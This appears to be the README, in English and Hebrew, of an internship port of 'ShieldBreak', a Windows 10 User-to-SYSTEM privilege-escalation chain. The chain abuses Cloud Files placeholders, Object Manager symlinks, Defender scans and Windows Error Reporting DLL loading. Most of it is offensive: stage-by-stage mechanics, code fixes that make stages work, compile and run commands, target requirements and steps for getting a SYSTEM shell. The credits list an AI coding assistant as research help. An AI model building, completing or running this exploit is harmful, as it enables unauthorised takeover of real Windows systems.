# ShieldBreak Win10 Port — ASI Internship Project

> **Purpose:** Windows 10 User→SYSTEM privilege escalation via Cloud Files + Defender + WER chain
> 
> **Status:** Core mechanisms WORKING, needs Win10 target for full chain validation
>
> **Target OS:** Windows 10 (NOT Server 2022)

---

## Quick Start

```bash
# Compile (requires Visual Studio Build Tools)
cl.exe shieldbreak_win10.cpp /Fe:shieldbreak.exe /link ntdll.lib CldApi.lib ole32.lib taskschd.lib advapi32.lib comsuppw.lib

# Run as regular user (NOT admin)
shieldbreak.exe
```

---

## Executive Summary

ShieldBreak is a User→SYSTEM privilege escalation chain that exploits the interaction between:
- **Windows Cloud Files API** (CfApi) - Create files with attacker-controlled content
- **Object Manager Symlinks** - Redirect Defender's file writes
- **Windows Defender** - Runs as SYSTEM, follows our symlinks
- **Windows Error Reporting** - Loads DLL with SYSTEM privileges

**Original:** [MSNightmare/ShieldBreak](https://github.com/MSNightmare/ShieldBreak)

---

## Current Status (2026-08-22)

### Testing Environment Issue
**IMPORTANT:** All testing was done on Windows Server 2022. The exploit is designed for Windows 10. Must re-test on actual Win10.

### What's Working (Validated on Server 2022)

| Stage | Component | Status | Notes |
|-------|-----------|--------|-------|
| 1 | Cloud Files Registration | WORKING | `CfRegisterSyncRoot`, `CfConnectSyncRoot` |
| 1 | Placeholder Creation | WORKING | `CfCreatePlaceholders` with FileIdentity fix |
| 1 | Cloud Callback | WORKING | Data transfer + ACK successful |
| 1 | File Hydration | WORKING | Placeholder converts to real file on access |
| 2 | Object Manager Dirs | WORKING | Creates in `\BaseNamedObjects\Restricted\` |
| 2 | Symlinks | WORKING | `NtCreateSymbolicLinkObject` redirects to workdir |
| 3 | MpClient Loading | WORKING | Dynamically loads Defender DLL |
| 3 | MpManagerOpen | WORKING | Connects to Defender service |
| 3 | MpScanStart | WORKING | Triggers scan on target file |
| 3 | CfHydratePlaceholder | WORKING | Forces callback trigger |
| 6 | WER Directory | WORKING | Creates fake crash report dir |
| 6 | Report.wer | WORKING | Creates WER report file |
| 6 | QueueReporting Task | WORKING | Triggers via Task Scheduler |
| 7 | Named Pipe Listener | WORKING | Waits for SYSTEM callback |

### What's Pending

| Issue | Description | Likely Cause |
|-------|-------------|--------------|
| SYSTEM Shell | Callback not received on pipe | Testing on wrong OS (Server 2022 vs Win10) |
| phoneinfo.dll | DLL not being written | Defender behavior differs on Server 2022 |

---

## The 7-Stage Exploit Chain

```
USER CONTEXT                                          SYSTEM CONTEXT
─────────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────────────┐
│  STAGE 1: Cloud Files Provider Registration                         │
├─────────────────────────────────────────────────────────────────────┤
│  CfRegisterSyncRoot() → Register fake cloud sync provider           │
│  CfConnectSyncRoot() → Connect callback handler                     │
│  CfCreatePlaceholders() → Create file that hydrates on access       │
│                                                                     │
│  KEY: When anyone reads this file, OUR callback supplies the data   │
│  FIX: Must allocate FileIdentity (0x130 bytes) for Win10           │
│  FIX: Must ACK data after transfer (CF_OPERATION_TYPE_ACK_DATA)    │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STAGE 2: Object Manager Namespace Setup                            │
├─────────────────────────────────────────────────────────────────────┤
│  NtCreateDirectoryObject() → \BaseNamedObjects\Restricted\WD_TARGET │
│  NtCreateDirectoryObject() → \BaseNamedObjects\Restricted\WD_SHADOW │
│  NtCreateSymbolicLinkObject() → WD_SCAN symlink → our workdir       │
│                                                                     │
│  KEY: Standard users CAN create dirs/symlinks here                  │
│  PURPOSE: When Defender writes through these paths, it lands in     │
│           our controlled directory instead of intended location     │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STAGE 3: Trigger Windows Defender Scan                             │
├─────────────────────────────────────────────────────────────────────┤
│  LoadLibrary(MpClient.dll) → Load Defender's client library         │
│  MpManagerOpen() → Connect to Defender service                      │
│  CfHydratePlaceholder() → Force file hydration (triggers callback)  │
│  MpScanStart(MPSCAN_TYPE_RESOURCE) → Scan our cloud file            │
│                                                                     │
│  RESULT: Defender reads cloud file → our callback delivers payload  │
│  KEY: Defender runs as SYSTEM and follows our symlinks              │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STAGE 4-5: CLFS Race / File Operations                             │
├─────────────────────────────────────────────────────────────────────┤
│  Defender processes scanned file                                    │
│  Defender writes through Object Manager symlinks                    │
│  Write lands in our workdir OR phoneinfo.dll location               │
│                                                                     │
│  KEY: TOCTOU race - symlink target can change mid-operation         │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STAGE 6: Windows Error Reporting Trigger                           │
├─────────────────────────────────────────────────────────────────────┤
│  CreateDirectory: C:\ProgramData\Microsoft\Windows\WER\ReportQueue\ │
│                   Kernel_c0000000_<guid>\                           │
│  CreateFile: Report.wer                                             │
│  ITaskService → Run "QueueReporting" scheduled task                 │
│                                                                     │
│  PURPOSE: WerFault.exe runs as SYSTEM and loads phoneinfo.dll       │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STAGE 7: SYSTEM Shell Callback                                     │
├─────────────────────────────────────────────────────────────────────┤
│  Listen on: \\.\pipe\SHIELDBREAK_<guid>                             │
│  WerFault loads our DLL → DLL connects to pipe → SYSTEM shell       │
│                                                                     │
│  PROOF: whoami returns "nt authority\system"                        │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Critical Fixes for Win10 Port

### Fix 1: FileIdentity Allocation (ERROR_CLOUD_FILE_NOT_IN_SYNC)
```cpp
// Without this: CfCreatePlaceholders fails with 0x8007017C
void* fileId = malloc(0x130);
memset(fileId, 0, 0x130);
placeholder.FileIdentity = fileId;
placeholder.FileIdentityLength = 0x130;
```

### Fix 2: Cloud Callback Must ACK Data
```cpp
// Without this: ReadFile hangs forever waiting for data
// Step 1: Transfer data
opParams.TransferData.Buffer = g_payload;
opParams.TransferData.Length.QuadPart = sizeof(g_payload);
opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
CfExecute(&opInfo, &opParams);

// Step 2: ACK the transfer (CRITICAL)
ackParams.AckData.CompletionStatus = 0;  // STATUS_SUCCESS
ackParams.AckData.Offset = offset;
ackParams.AckData.Length = length;
ackInfo.Type = CF_OPERATION_TYPE_ACK_DATA;
CfExecute(&ackInfo, &ackParams);
```

### Fix 3: Unique Pipe Names Per Session
```cpp
// Without this: ERROR_PIPE_BUSY (231) on re-runs
wchar_t guid[64];
ULONGLONG tick = GetTickCount64();
DWORD pid = GetCurrentProcessId();
swprintf(guid, 64, L"%llX%X", tick, pid);
swprintf(pipeName, 128, L"\\\\.\\pipe\\SHIELDBREAK_%ws", guid);
```

### Fix 4: Correct Sync Policies (Match Original)
```cpp
policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
policies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_AUTO_DEHYDRATION_ALLOWED | 
                              CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
policies.InSync = CF_INSYNC_POLICY_NONE;
policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
```

### Fix 5: COM Initialization Before GUID
```cpp
// CoCreateGuid requires COM
CoInitializeEx(NULL, COINIT_MULTITHREADED);
```

---

## Testing Requirements

### Target System
- **OS:** Windows 10 (version 1709 or later) — **NOT Server 2022**
- **Defender:** Real-Time Protection ENABLED
- **Cloud Protection:** Can be disabled
- **User:** Standard user account (**NOT admin**)
- **phoneinfo.dll:** Should NOT exist in System32

### Build Requirements
- Visual Studio Build Tools 2019/2022
- Windows SDK with CfApi headers
- Libraries: ntdll.lib, CldApi.lib, ole32.lib, taskschd.lib, advapi32.lib, comsuppw.lib

### Compile Command
```bash
cl.exe shieldbreak_win10.cpp /Fe:shieldbreak.exe /link ntdll.lib CldApi.lib ole32.lib taskschd.lib advapi32.lib comsuppw.lib
```

---

## Files

| File | Description |
|------|-------------|
| `win10-port/shieldbreak_win10.cpp` | Main exploit - full 7-stage chain |
| `win10-port/stage1_test_cloudfiles.cpp` | Test Cloud Files API in isolation |
| `win10-port/stage2_test_objmgr.cpp` | Test Object Manager in isolation |
| `win10-port/stage3_test_defender.cpp` | Test Defender integration in isolation |
| `win10-port/warden_win10.cpp` | Payload DLL source (connects to pipe) |
| `original/` | Original MSNightmare code for reference |

---

## Next Steps

1. **Get Windows 10 machine** (VM or physical)
2. **Transfer shieldbreak.exe** to Win10
3. **Create test user** (non-admin)
4. **Enable Defender RTP**
5. **Run exploit as test user**
6. **Verify SYSTEM shell on pipe**

---

## Debugging Output Example

Successful run shows:
```
[+] Target DLL location available: C:\Windows\System32\phoneinfo.dll
[*] COM init result: 0x00000000
[+] Session ID: B60B4A62248
[+] Named pipe created successfully
[+] Work directory: C:\Users\testuser\AppData\Local\Temp\ShieldBreak_B60B4A62248

[*] Stage 1: Registering cloud provider...
[+] Cloud provider registered
[+] Cloud callback connected
[+] Placeholder file created (1 processed)

[*] Stage 2: Setting up object manager namespaces...
[+] Created: \BaseNamedObjects\Restricted\WD_TARGET_B60B4A62248
[+] Created: \BaseNamedObjects\Restricted\WD_SHADOW_B60B4A62248
[+] Symlink: WD_SCAN -> \??\C:\Users\testuser\AppData\Local\Temp\ShieldBreak_B60B4A62248
[+] Object manager links created

[*] Stage 3: Triggering Windows Defender scan...
[+] Scan thread started
[*] Cloud callback triggered!
[+] Data transferred and ACK'd
[+] CfHydratePlaceholder succeeded
[+] MpScanStart succeeded!

[*] Stage 6: Triggering Windows Error Reporting...
[+] Created WER dir
[+] Created Report.wer
[*] WER stage complete

[*] Stage 7: Waiting for SYSTEM shell callback...
[*] Listening on \\.\pipe\SHIELDBREAK_B60B4A62248...
```

---

# Hebrew Documentation / תיעוד בעברית

## סיכום מנהלים

ShieldBreak היא שרשרת הסלמת הרשאות מ-User ל-SYSTEM שמנצלת את האינטראקציה בין:
- **Windows Cloud Files API** - יצירת קבצים עם תוכן שנשלט על ידי התוקף
- **Object Manager Symlinks** - הפניית כתיבות של Defender
- **Windows Defender** - רץ כ-SYSTEM, עוקב אחרי ה-symlinks שלנו
- **Windows Error Reporting** - טוען DLL עם הרשאות SYSTEM

**מקור:** [MSNightmare/ShieldBreak](https://github.com/MSNightmare/ShieldBreak)

---

## מצב נוכחי (22-08-2026)

### בעיית סביבת בדיקה
**חשוב:** כל הבדיקות בוצעו על Windows Server 2022. הניצול מיועד ל-Windows 10. חייבים לבדוק מחדש על Win10 אמיתי.

### מה עובד (אומת על Server 2022)

| שלב | רכיב | סטטוס |
|-----|------|-------|
| 1 | רישום Cloud Files | עובד |
| 1 | יצירת Placeholder | עובד (עם תיקון FileIdentity) |
| 1 | Cloud Callback | עובד (העברת נתונים + ACK) |
| 1 | Hydration קובץ | עובד |
| 2 | ספריות Object Manager | עובד |
| 2 | Symlinks | עובד |
| 3 | טעינת MpClient | עובד |
| 3 | MpScanStart | עובד |
| 6 | ספריית WER | עובד |
| 6 | משימת QueueReporting | עובד |
| 7 | Named Pipe | עובד |

### מה ממתין

| בעיה | תיאור | סיבה סבירה |
|------|-------|-------------|
| Shell SYSTEM | לא התקבל callback | בדיקה על מערכת הפעלה שגויה |
| phoneinfo.dll | לא נכתב | התנהגות Defender שונה על Server 2022 |

---

## שרשרת הניצול בת 7 השלבים

### שלב 1: רישום ספק Cloud Files
```
CfRegisterSyncRoot() → רישום ספק סנכרון מזויף
CfConnectSyncRoot() → חיבור handler של callback
CfCreatePlaceholders() → יצירת קובץ שמתמלא בגישה
```
**מפתח:** כשמישהו קורא את הקובץ, ה-callback שלנו מספק את הנתונים

**תיקון קריטי - FileIdentity:**
```cpp
void* fileId = malloc(0x130);
placeholder.FileIdentity = fileId;
placeholder.FileIdentityLength = 0x130;
```

**תיקון קריטי - ACK אחרי העברה:**
```cpp
ackParams.AckData.CompletionStatus = 0;
ackInfo.Type = CF_OPERATION_TYPE_ACK_DATA;
CfExecute(&ackInfo, &ackParams);
```

### שלב 2: הגדרת Object Manager
```
NtCreateDirectoryObject() → יצירת WD_TARGET_<guid>
NtCreateDirectoryObject() → יצירת WD_SHADOW_<guid>
NtCreateSymbolicLinkObject() → symlink שמצביע לתיקייה שלנו
```
**מפתח:** משתמשים רגילים יכולים ליצור ספריות ו-symlinks ב-`\BaseNamedObjects\Restricted\`

### שלב 3: הפעלת סריקת Defender
```
LoadLibrary(MpClient.dll) → טעינת ספריית הלקוח של Defender
MpManagerOpen() → התחברות לשירות Defender
CfHydratePlaceholder() → הפעלת callback בכוח
MpScanStart() → סריקת הקובץ שלנו
```
**מפתח:** Defender רץ כ-SYSTEM ועוקב אחרי ה-symlinks

### שלב 4-5: פעולות קבצים
- Defender מעבד את הקובץ הנסרק
- Defender כותב דרך symlinks של Object Manager
- הכתיבה מגיעה לתיקייה שלנו או למיקום phoneinfo.dll

### שלב 6: הפעלת WER
```
CreateDirectory → C:\ProgramData\Microsoft\Windows\WER\ReportQueue\Kernel_...
CreateFile → Report.wer
ITaskService → הרצת QueueReporting
```
**מפתח:** WerFault.exe רץ כ-SYSTEM וטוען phoneinfo.dll

### שלב 7: Shell של SYSTEM
```
האזנה על: \\.\pipe\SHIELDBREAK_<guid>
WerFault טוען את ה-DLL שלנו → ה-DLL מתחבר ל-pipe → Shell של SYSTEM
```

---

## דרישות לבדיקה

### מערכת יעד
- **מערכת הפעלה:** Windows 10 (גרסה 1709+) — **לא Server 2022**
- **Defender:** הגנה בזמן אמת מופעלת
- **משתמש:** חשבון משתמש רגיל (**לא admin**)

### דרישות בנייה
- Visual Studio Build Tools 2019/2022
- Windows SDK עם כותרות CfApi

### פקודת קומפילציה
```bash
cl.exe shieldbreak_win10.cpp /Fe:shieldbreak.exe /link ntdll.lib CldApi.lib ole32.lib taskschd.lib advapi32.lib comsuppw.lib
```

---

## צעדים הבאים

1. **השגת מכונת Windows 10** (VM או פיזית)
2. **העברת shieldbreak.exe** ל-Win10
3. **יצירת משתמש בדיקה** (לא admin)
4. **הפעלת RTP של Defender**
5. **הרצת הניצול כמשתמש בדיקה**
6. **אימות קבלת shell של SYSTEM**

---

## Credits

- **Original:** [MSNightmare/ShieldBreak](https://github.com/MSNightmare/ShieldBreak)
- **Win10 Port:** ASI Internship Project (Rainfantry)
- **Research Assistance:** Claude Code

---

## Disclaimer / הצהרת אחריות

This documentation is for authorized security research and defensive analysis only.

תיעוד זה מיועד למחקר אבטחה מורשה וניתוח הגנתי בלבד.
